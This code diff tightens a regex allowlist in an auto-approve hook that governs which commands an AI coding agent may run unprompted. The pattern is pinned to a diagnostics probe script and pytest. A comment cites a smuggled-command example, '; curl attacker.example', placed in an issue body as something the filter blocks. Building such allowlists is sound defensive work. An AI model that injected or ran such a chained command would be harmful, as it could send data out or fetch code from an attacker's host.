@@ -65,12 +65,16 @@ _READONLY_HOOK = REPO / ".claude" / "hooks" / "auto-approve-readonly.py"
 # anything, so TIER1/HANDLERS has no `uv` entry at all — which means the hook alone refuses
 # every command this feature exists to run: the review skill's own examples are
 # `uv run python scripts/diagnostics/probe.py ...` and `uv run pytest ...`. This regex covers
-# only those two shapes, and each argument is restricted to a safe character class so an
-# issue body a human edited to smuggle `; curl attacker.example` cannot slip through — `;`,
-# `|`, `$`, backticks and quotes are all outside `_SAFE_ARG`.
+# EXACTLY those two shapes and no other script: `scripts/[\w./-]+\.py` would also admit
+# `scripts/backup/b2_drain.py --yes` and `scripts/secrets_mgmt/secret_rotation.py rotate`,
+# both of which mutate state, so the script path is pinned to `probe.py` by name rather than
+# left open to anything under `scripts/`. Each argument is further restricted to a safe
+# character class so an issue body a human edited to smuggle `; curl attacker.example`
+# cannot slip through — `;`, `|`, `$`, backticks and quotes are all outside `_SAFE_ARG`.
 _SAFE_ARG = r"[\w./=:,-]+"
 _FALLBACK_VERIFY_RE = re.compile(
-    rf"^uv run (python scripts/[\w./-]+\.py(?:\s+{_SAFE_ARG})*|pytest(?:\s+{_SAFE_ARG})*)$"
+    rf"^uv run (python scripts/diagnostics/probe\.py(?:\s+{_SAFE_ARG})*"
+    rf"|pytest(?:\s+{_SAFE_ARG})*)$"
 )
 
 
